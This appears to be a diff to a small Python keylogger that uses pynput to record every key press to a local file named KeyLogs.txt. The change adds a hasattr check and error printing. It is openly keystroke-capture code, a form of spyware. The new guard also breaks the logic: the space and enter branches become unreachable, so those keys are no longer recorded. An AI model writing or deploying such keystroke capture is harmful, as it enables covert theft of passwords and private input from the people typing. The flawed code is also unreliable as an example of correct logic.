@@ -33,13 +33,15 @@ class KeyLogger:
 
         f = open(r"KeyLogs.txt","a")
         try:
-            if key == keyboard.Key.space:
-                f.write(" ")
-            elif key == keyboard.Key.enter:
-                f.write("\n")
-            else:
-                f.write(str(key.char))
-        except AttributeError:
+            if hasattr(key, 'char'):
+                if key == keyboard.Key.space:
+                    f.write(" ")
+                elif key == keyboard.Key.enter:
+                    f.write("\n")
+                else:
+                    f.write(str(key.char))
+        except AttributeError as e:
+            print(e)
             exit(-1)
         
         f.close()
@@ -53,5 +55,7 @@ class KeyLogger:
 
 if __name__=="__main__":
     f = open("KeyLogs.txt", "w+")
+    
     with keyboard.Listener(on_press=KeyLogger.daemon) as listener:
         listener.join()
+    
